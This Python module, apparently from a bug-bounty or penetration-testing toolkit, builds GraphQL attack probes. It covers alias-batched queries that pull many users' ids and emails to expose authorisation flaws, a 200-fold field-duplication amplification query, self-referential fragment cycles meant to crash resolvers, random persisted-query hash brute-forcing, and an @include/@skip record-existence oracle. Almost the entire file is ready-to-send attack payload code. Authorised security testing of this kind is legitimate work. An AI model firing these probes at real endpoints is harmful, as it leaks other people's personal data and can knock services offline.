"""GraphQL batch / alias / duplication attack module.

Active probes for the modern GraphQL attack surface that the existing
``graphql_fuzzer`` and ``detection/api/graphql_introspection`` modules
do not cover. The attacks implemented here are the highest-payout
GraphQL classes observed on bug-bounty programs in 2024-2026:

* **Alias-based batching** — same field, multiple aliases, each with
  a different argument. Lets a single authenticated user exfiltrate
  other users' data through a single endpoint that doesn't enforce
  per-row authorisation.
* **Field-duplication** — duplicate a sensitive field hundreds of
  times in one query. Some backends multiply per-row DB queries
  (N+1) and crash or expose timing differences.
* **Fragment-cycle DoS** — circular fragment spreads that force the
  resolver to recurse. Old GraphQL libs (early graphql-core,
  graphql-go < 0.8) crash with stack overflow.
* **Persisted-query ID brute-force** — try random short IDs against
  ``/graphql`` with the ``persistedQuery`` extension; the Apollo
  default has an ID space small enough to enumerate.
* **@include / @skip conditional leakage** — when the same field
  can be conditionally included or skipped, the resolver may
  behave differently for ``true`` vs ``false`` and leak whether
  the underlying record exists (boolean oracle for IDOR).

The module is dependency-free and is wired into the analysis
pipeline via :class:`GraphQLBatchAttack`.
"""

from __future__ import annotations

import logging
import random
import string
from collections.abc import Iterable
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass(slots=True)
class GraphQLProbe:
    """A single GraphQL probe ready to send."""

    label: str
    query: str
    variables: dict[str, Any] = field(default_factory=dict)
    extensions: dict[str, Any] = field(default_factory=dict)
    expected_anomaly: str = ""

    def to_payload(self) -> dict[str, Any]:
        payload: dict[str, Any] = {"query": self.query}
        if self.variables:
            payload["variables"] = self.variables
        if self.extensions:
            payload["extensions"] = self.extensions
        return payload


def _stable_id() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


class GraphQLBatchAttack:
    """Generate GraphQL batch / alias / duplication probes.

    Parameters
    ----------
    endpoint:
        The GraphQL endpoint URL (e.g. ``https://target.com/graphql``).
    schema_hints:
        Optional dict of field names discovered via introspection. The
        attack module will use these to generate realistic-looking
        queries. When empty, generic placeholders are used.
    """

    def __init__(
        self,
        endpoint: str,
        schema_hints: dict[str, Any] | None = None,
    ) -> None:
        self.endpoint = endpoint
        self.schema_hints = dict(schema_hints or {})
        self._query_type = self.schema_hints.get("queryType") or "Query"
        self._mutation_type = self.schema_hints.get("mutationType") or "Mutation"

    # ------------------------------------------------------------------
    # Probe factories
    # ------------------------------------------------------------------

    def alias_batching(
        self,
        field: str = "user",
        arg_template: str = '{id: "%s"}',
        sample_ids: Iterable[str] | None = None,
        max_aliases: int = 25,
    ) -> GraphQLProbe:
        """Generate an alias-batched query that asks for ``field`` with
        a list of distinct arguments, one per alias.

        Defaults to ``user(id: "...")`` and 25 sample IDs. If the
        endpoint has no per-row authorisation, the response will
        include the requested user records, exposing an IDOR.
        """
        ids = (
            list(sample_ids)
            if sample_ids is not None
            else [str(i) for i in range(1, max_aliases + 1)]
        )
        aliases: list[str] = []
        for i, uid in enumerate(ids[:max_aliases]):
            arg = arg_template % uid
            aliases.append(f"  a{i}: {field}{arg} {{ id email }}")
        query = "query AliasBatch {\n" + "\n".join(aliases) + "\n}"
        return GraphQLProbe(
            label="graphql-alias-batching",
            query=query,
            expected_anomaly="Multiple records returned in a single query (potential IDOR)",
        )

    def field_duplication(
        self,
        field: str = "user",
        count: int = 200,
    ) -> GraphQLProbe:
        """Duplicate a field N times to surface N+1 amplification.

        Some backends will issue N database queries and either slow
        down dramatically (timing oracle) or hit query-cost limits
        (cost-amplification DoS).
        """
        body = (
            "  f0: "
            + field
            + " { id }\n"
            + "".join(f"  f{i}: {field} {{ id }}\n" for i in range(1, count))
        )
        return GraphQLProbe(
            label="graphql-field-duplication",
            query="query DupField {\n" + body + "}",
            expected_anomaly="Slow response / amplification (>100x latency vs single query)",
        )

    def fragment_cycle_dos(self, depth: int = 30) -> GraphQLProbe:
        """Build a self-referential fragment cycle.

        ``frA -> frB -> frA``. Resolvers that don't guard against
        fragment cycles will recurse ``depth`` times per resolve and
        crash with a stack overflow.
        """
        head = f"query FragCycle {{ {self._query_type.lower() if self._query_type else 'node'} {{ ...frA }} }}"
        # Build the cycle in reverse so the top of the query reads naturally.
        body = ["fragment frA on Query { ...frB }", "fragment frB on Query { ...frA }"]
        for i in range(depth - 2):
            body.append(f"fragment frA{i} on Query {{ ...frA{i + 1} }}")
            body.append(f"fragment frB{i} on Query {{ ...frA{i} }}")
        return GraphQLProbe(
            label="graphql-fragment-cycle-dos",
            query=head + "\n" + "\n".join(body),
            expected_anomaly="500/timeout/stack overflow",
        )

    def persisted_query_bruteforce(self, attempts: int = 50) -> list[GraphQLProbe]:
        """Generate ``attempts`` persisted-query probes with random short IDs.

        Some Apollo / Relay setups accept any ``sha256Hash`` as a
        persisted-query ID; an attacker who can guess one (the ID
        space is small for short hashes) can replay a query without
        ever sending the actual document.
        """
        probes: list[GraphQLProbe] = []
        for i in range(attempts):
            short_id = "".join(random.choices("0123456789abcdef", k=8))
            probes.append(
                GraphQLProbe(
                    label=f"graphql-persisted-query-{i}",
                    query="",
                    extensions={
                        "persistedQuery": {
                            "version": 1,
                            "sha256Hash": short_id,
                        }
                    },
                    expected_anomaly="Persisted query lookup by guessed short hash succeeded",
                )
            )
        return probes

    def include_skip_oracle(
        self,
        field: str = "user",
        record_id: str = "1",
    ) -> list[GraphQLProbe]:
        """Probe @include/@skip boolean oracle.

        When the resolver leaks whether the underlying record exists
        (e.g. by returning 200 vs 404 with different field sets), an
        attacker can enumerate IDs. We send the same field with
        ``@include`` and ``@skip`` toggled to detect a differential.
        """
        return [
            GraphQLProbe(
                label="graphql-include-skip-on",
                query=(
                    "query Inc($on: Boolean!) {\n"
                    f'  target: {field}(id: "{record_id}") @include(if: $on) {{ id email }}\n'
                    "}"
                ),
                variables={"on": True},
            ),
            GraphQLProbe(
                label="graphql-include-skip-off",
                query=(
                    "query Inc($on: Boolean!) {\n"
                    f'  target: {field}(id: "{record_id}") @include(if: $on) {{ id email }}\n'
                    "}"
                ),
                variables={"on": False},
            ),
        ]

    # ------------------------------------------------------------------
    # Convenience
    # ------------------------------------------------------------------

    def all_probes(self) -> list[GraphQLProbe]:
        """Return one of each probe type — useful for a one-shot scan."""
        return [
            self.alias_batching(),
            self.field_duplication(),
            self.fragment_cycle_dos(),
            *self.persisted_query_bruteforce(attempts=5),
            *self.include_skip_oracle(),
        ]


__all__ = [
    "GraphQLBatchAttack",
    "GraphQLProbe",
]
